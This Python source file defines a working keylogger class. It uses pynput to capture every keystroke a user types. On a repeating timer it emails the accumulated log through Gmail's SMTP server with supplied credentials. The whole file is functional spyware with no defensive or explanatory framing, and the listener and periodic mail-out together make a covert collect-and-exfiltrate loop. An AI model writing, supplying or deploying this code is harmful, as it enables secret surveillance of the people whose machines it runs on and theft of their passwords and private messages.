import pynput.keyboard as keyboard
import threading
import smtplib

class keylogger:
	def __init__(self, time, email, password):
		# Initialize the keylogger
		self.log = "[+] The keylogger has started."
		self.time_interval = time
		self.email = email
		self.password = password

	def append_log(self, string):
		# Append the string to the log
		self.log += string

	def key_pressed(self, key):
		# Handle key press event
		try:
			key_special = str(key.char)
		except AttributeError:
			if key == keyboard.Key.space:
				key_special = " "
			else:
				key_special = " " + str(key) + " "
		self.append_log(key_special)

	def mail_sender(self, email, password, message):
		# Send the log via email
		server = smtplib.SMTP("smtp.gmail.com", 587)
		server.starttls()
		server.login(email, password)
		server.sendmail(email, email, message)
		server.quit()

	def mail(self):
		# Send the log periodically via email
		self.mail_sender(self.email, self.password, "\n\n" + self.log)
		self.log = ""
		timer = threading.Timer(self.time_interval, self.mail)
		timer.start()
	
	def launchApp(self):
		# Launch the keylogger
		listener = keyboard.Listener(on_press=self.key_pressed)
		with listener:
			self.mail()
			listener.join()